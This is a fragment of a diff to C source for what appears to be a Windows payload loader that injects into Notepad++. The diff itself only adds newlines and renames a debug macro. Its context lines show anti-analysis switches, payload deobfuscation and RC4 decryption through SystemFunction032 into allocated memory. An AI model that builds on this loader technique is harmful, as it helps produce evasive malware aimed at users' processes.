@@ -9,7 +9,7 @@
 //#define LOCAL_INJECTION
 #define TARGET_PROCESS L"Notepad++.exe"
 
-#ifndef DEBUG
+#ifndef _DEBUG
 #define ANTI_ANALYSIS
 #endif
 
@@ -80,7 +80,7 @@ int main() {
 	CopyMemoryEx(pAllocatedAddress, pPayloadAddress, sPayloadSize);
 
 	// Deobfuscating the payload
-	PRINTA("[#] Press <Enter> To Deobfuscate The Payload ... ");
+	PRINTA("[#] Press <Enter> To Deobfuscate The Payload ... \n");
 	GETCHAR();
 	SIZE_T	DeobfuscatedPayloadSize = NULL;
 	PBYTE	DeobfuscatedPayloadBuffer = NULL;
@@ -92,15 +92,15 @@ int main() {
 	PRINTA("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", (DWORD)DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);
 
 	// Copying the deobfuscated payload to the allocated address
-	PRINTA("[#] Press <Enter> To Copy The Deobfuscated Payload ... ");
+	PRINTA("[#] Press <Enter> To Copy The Deobfuscated Payload ... \n");
 	GETCHAR();
 	CopyMemoryEx(pAllocatedAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);
 
 	// Update the payload size
-	sPayloadSize = DeobfuscatedPayloadSize;	
+	sPayloadSize = DeobfuscatedPayloadSize;
 
 	// Decrypting the payload
-	PRINTA("[#] Press <Enter> To Decrypt The Payload ... ");
+	PRINTA("[#] Press <Enter> To Decrypt The Payload ... \n");
 	GETCHAR();
 
 	if (!Rc4DecryptionViSystemFunc032(ProtectedKey, pAllocatedAddress, KEY_SIZE, sPayloadSize)) {
